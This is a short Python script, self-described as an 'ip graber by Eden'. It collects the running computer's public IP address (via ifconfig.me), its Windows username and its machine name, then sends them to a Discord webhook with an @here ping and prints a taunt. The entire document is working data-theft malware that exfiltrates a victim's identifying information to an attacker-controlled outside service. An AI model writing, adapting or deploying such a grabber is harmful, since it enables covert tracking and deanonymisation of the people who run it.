import os
from urllib.request import Request, urlopen
from discord_webhook import DiscordWebhook
WEBHOOK_URL = "your webhook url"
pc_username = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
webhook = DiscordWebhook(url=WEBHOOK_URL, content="@here new ip " + ip + " from " + pc_name + " user: " + pc_username + " ip graber by Eden")
response = webhook.execute()
print("get fuck", ip)